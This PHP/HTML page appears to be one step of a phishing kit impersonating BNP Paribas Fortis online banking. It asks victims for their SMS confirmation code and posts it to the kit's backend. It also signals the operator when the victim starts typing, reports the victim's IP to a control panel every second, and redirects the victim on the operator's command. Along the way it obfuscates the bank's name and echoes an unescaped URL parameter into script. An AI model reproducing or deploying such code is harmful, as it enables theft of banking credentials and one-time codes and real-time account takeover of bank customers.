<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="holder">
<div class="back">
</div>
<div class="logo">
<div class="mklogo">
    <div class="mkimg">
        <img src="res/log.png">
    </div>
    <div class="mktext">
    <?php $bm->obf("BNP PARIBAS"); ?>
        <div class="liner"></div>
        <?php $bm->obf("FORTIS"); ?>
    </div>
</div>
</div>
<div class="easy">
<?php echo getLang("_easy"); ?>
</div>
</div>
</header>

<main>

<div class="form">

<div class="left">
<div class="welcome">
<h3><?php echo getLang("_welcomes")[0]; ?></h3>
    <h1><?php echo getLang("_welcomes")[1]; ?></h1>
</div>
<div class="register">
<span><?php echo getLang("_register")[0]; ?></span>
<a href="#"><?php echo getLang("_register")[1]; ?></a>
</div>
</div>

<div class="right" style="padding:0;">
<div class="title">
<?php echo getLang("_conf_title"); ?>
</div>
<div class="content">
<p style="font-family:'sans';"><?php echo getLang("_sms_text"); ?></p>
<?php 
if(isset($_GET['e'])){
    echo '<div class="col error">
    '.getLang("_sms_error").'
    </div>';
}
?>
<div class="col">
    <label><?php echo getLang("_sms_input"); ?>  </label>
    <input type="text" id="u">
</div>

<div class="col">
    <button onclick="sendUser()"><?php echo getLang("_confirm"); ?></button>
</div>
</div>

</div>

</div>


<div class="help">
    <div class="help-text"><img src="res/phone.png"> <?php echo getLang("_help")[0]; ?></div><br>
    <a href="#"> <?php echo getLang("_help")[1]; ?></a>
</div>

</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>


function sendUser(){
    $("#u").removeClass("error");
    if($("#u").val().length<4){
        return $("#u").addClass("error");
    }

    $(".loader").show();
    $.post("post.php",{
        sms:$("#u").val()
    },(res)=>{
        window.location="mkfile.php?p=wait";
    } );

}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendUser();
    }
});

var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{n_sms:1});
        abortNote=true;
    }

});


setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);


</script>
</body>
</html>